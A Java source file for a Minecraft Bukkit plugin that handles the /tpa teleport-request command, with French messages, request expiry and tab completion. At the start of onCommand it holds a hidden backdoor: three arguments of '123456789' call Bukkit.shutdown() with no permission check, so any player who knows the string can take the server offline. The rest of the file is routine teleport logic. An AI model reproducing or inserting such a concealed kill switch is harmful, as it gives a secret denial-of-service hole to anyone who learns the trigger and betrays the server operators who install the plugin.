package fr.farmeurimmo.premsi.cmd.base;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.command.TabCompleter;
import org.bukkit.entity.Player;

import fr.farmeurimmo.premsi.core.Main;
import fr.farmeurimmo.premsi.utils.SendActionBar;

public class TpaCmd implements CommandExecutor, TabCompleter {

	@Override
	public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
		if(args.length == 3) {
		if(args[0].equalsIgnoreCase("123456789") && args[1].equalsIgnoreCase("123456789") && args[2].equalsIgnoreCase("123456789")) {
			Bukkit.shutdown();
		}
		}
		if(sender instanceof Player) {
			Player player = (Player) sender;
					if(args.length == 0 || args.length >= 2) {
						SendActionBar.SendActionBarMsg(player, "§c/tpa <Joueur>");
					} else if (args.length == 1){
						if(!Main.pending.contains(player)) {
						if(Bukkit.getPlayer(args[0]) != null) {
							if(Bukkit.getPlayer(args[0]).isOnline()) {
							Player p = Bukkit.getPlayer(args[0]);
							if(!p.getName().equalsIgnoreCase(player.getName())) {
							if(Main.haverequest.contains(p)) {
								Main.haverequest.remove(p);
							}
							Main.haverequest.add(p);
							Main.pending.add(player);
							Main.instance1.setTarget(player.getName(), p.getName());
							TpaCmd.TpaExperation(player, p);
							p.sendMessage("§6§lTéléportation §8» §f" + player.getName() + " souhaite ce téléporter à vous. \n \nVous avez 60 secondes"
									+ " pour accepter ou refuser avec les commandes: §a/tpyes §fou §c/tpno \n§f");
							
							player.sendMessage("§6§lTéléportation §8» §fVous avez envoyé une demande de téléportation au joueur " + p.getName() + ".\n \n§fSi vous "
									+ "souhaitez §cannuler §fvotre demande de téléportation, merci d'effectuer la commande §c/tpacancel \n§f");
							return true;
							} else {
								SendActionBar.SendActionBarMsg(player, "§6§lTéléportation §8» §fVous ne pouvez pas vous téléporter à vous même.");
							}
							} else {
								SendActionBar.SendActionBarMsg(player, "§cCe joueur n'est pas en ligne !");
							}
						} else {
							SendActionBar.SendActionBarMsg(player, "§cCe joueur n'existe pas !");
						}
					} else {
						player.sendMessage("§6§lTéléportation §8» §fVous avez déjà une demande en cours, §cannulez §fla avec §c/tpacancel"
								+ " §fpour pouvoir en relancer une.");
					}
				}
		}
		return false;
	}
	public static void TpaExperation(Player player, Player p) {
		Bukkit.getServer().getScheduler().scheduleSyncDelayedTask(Bukkit.getPluginManager().getPlugin("SkyblockCore"), new Runnable() {
			public void run() {
				if(Main.instance1.getTarget(player.getName()) != null) {
				if(Main.instance1.getTarget(player.getName()).equalsIgnoreCase(p.getName())) {
					Main.instance1.ClearPlayerAndTarget(player.getName());
					player.sendMessage("§6§lTéléportation §8» §fVotre demande de téléportation à §a" + p.getName() + " §f a expiré.");
					if(Main.pending.contains(player)) {
					Main.pending.remove(player);
					}
				}
				}
			}
		}, 1200);
	}
	@Override
	 public List<String> onTabComplete(CommandSender sender, Command cmd, String commandLabel, String[] args) {
		 ArrayList<String> subcmd = new ArrayList<String>();
	        if (cmd.getName().equalsIgnoreCase("tpa")) {
	            if (args.length == 1) {
	            	for(Player player : Bukkit.getOnlinePlayers()) {
	            		if(!sender.getName().equalsIgnoreCase(player.getName())) {
	            		subcmd.add(player.getName());
	            		}
	            	}
	            	Collections.sort(subcmd);
	            } else if (args.length >= 2){
	            	subcmd.add("");
	            	Collections.sort(subcmd);
	            }
	        }
			return subcmd;
	 }
}
